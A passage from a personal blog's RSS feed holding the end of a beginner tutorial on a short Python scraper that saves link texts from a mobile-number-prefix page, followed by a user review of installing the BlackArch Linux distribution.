</span></span></code></pre></td></tr></table>
</div>
</div><p>There is a file called <strong>setup.py</strong> in there. Execute it using Python:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo python setup.py
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then pip will be installed automatically.</p>
<h2 id="required-modules">Required Modules</h2>
<p>The web crawler in this post uses the following modules:</p>
<ul>
<li>requests, for sending HTTP/1.1 requests</li>
<li>BeautifulSoup, for parsing HTML and XML documents</li>
</ul>
<p>We can install them using the following command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pip install requests BeautifulSoup
</span></span></code></pre></td></tr></table>
</div>
</div><p>If you find that the installation speed is slow, you can refer to <a href="https://www.cnblogs.com/microman/p/6107879.html" target="_blank" rel="noopener noreffer">this link</a> to change the mirror source to a domestic one.</p>
<h2 id="public-code">Public Code</h2>
<p>Here&rsquo;s the code for a simple phone number crawler:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;简易手机号码抓取工具 By WeepingDogel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://www.hiphop8.com/mobile/xian_1319339.html&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">page</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">page_info</span><span class="o">=</span><span class="n">page</span><span class="o">.</span><span class="n">content</span>
</span></span><span class="line"><span class="cl"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">page_info</span><span class="p">,</span> <span class="s2">&#34;html.parser&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">numbers</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;1319339.txt&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">number</span> <span class="ow">in</span> <span class="n">numbers</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">number</span><span class="o">.</span><span class="n">string</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="o">.</span><span class="n">string</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>You can copy the above code into a Python file and run or modify it as needed.</p>
<h2 id="in-conclusion">In Conclusion</h2>
<p>I wrote this post in a hurry, so it may not be detailed enough. Please forgive me. <del>There&rsquo;s a comment section below, feel free to leave comments (or criticize me).</del></p>
]]></description>
</item><item>
    <title>BlackArch Experience Report</title>
    <link>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</link>
    <pubDate>Sun, 16 Jun 2019 16:33:47 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/%E5%85%B3%E4%BA%8Eblackarch%E7%9A%84%E4%BD%93%E9%AA%8C%E6%8A%A5%E5%91%8A/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/ba-slider.png" referrerpolicy="no-referrer">
            </div><blockquote>
<p><em>Today, I attempted to install BlackArch and spent quite a long time doing so. However, I later discovered that this system was not very perfect.</em></p>
</blockquote>
<h2 id="advantages">Advantages</h2>
<p>Firstly, let&rsquo;s talk about its advantages:</p>
<ul>
<li>This thing integrates thousands of software packages, all of which are powerful tools.</li>
<li>Secondly, this thing is cool, especially the wallpaper and color matching, which I think are particularly stunning.</li>
<li>Its ease of installation is also a plus. Initially, I thought it would be more difficult to install than Arch, but after using it, I found that its installation process is ten times simpler than Arch. It&rsquo;s just that I&rsquo;m used to the manual style of Arch and not accustomed to this semi-automated approach.</li>
</ul>
<h2 id="disadvantages">Disadvantages</h2>
<p>Now, let&rsquo;s talk about the disadvantages:</p>
<ul>
<li>First of all, the ISO is really too big. The official live ISO for BlackArch is 12GB, which took me a long time to download using IDM. The network installation package is the same size as Arch, but I haven&rsquo;t tried it.</li>
<li>What&rsquo;s more alarming is that the minimum hard disk requirement for installing blackarch&rsquo;s official mirrors is over 40GB, which makes it difficult for most people to meet this installation condition.</li>
<li>Secondly, its desktop environment is too basic and its performance is particularly poor, especially for i3 and spectrwm, which are impossible to operate. Fluxbox is the coolest, but its habits are not suitable for most people. Openbox has nothing, and it&rsquo;s even harder to operate. It also doesn&rsquo;t support Chinese, which is very annoying. Also, the dependencies are too messy, making it difficult to switch to other desktop environments. For example, when I wanted to uninstall others and switch to xfce, I couldn&rsquo;t uninstall them with &ldquo;pacman -Rs&rdquo;. I had to use &ldquo;Rsc&rdquo; to uninstall them, but as a result, I uninstalled &ldquo;lxdm&rdquo;, which prevented me from entering graphics mode. Later, when I installed &ldquo;lxdm&rdquo;, there was a major color bug.</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Firstly, it cannot be denied that BlackArch is a good thing for showing off, but I do not recommend using the official mirror (whether it is an online mirror or an offline live one) for installation, otherwise, you will end up like me. Secondly, users must have a foundation in the Arch series; otherwise, it will be a pitfall. It is recommended to install Arch first and then import BlackArch&rsquo;s software library to install the full set of tools. Finally, please do not compare BlackArch with Kali or Parrot. They are not comparable in terms of tools.</p>
]]></description>
</item></channel>
</rss>
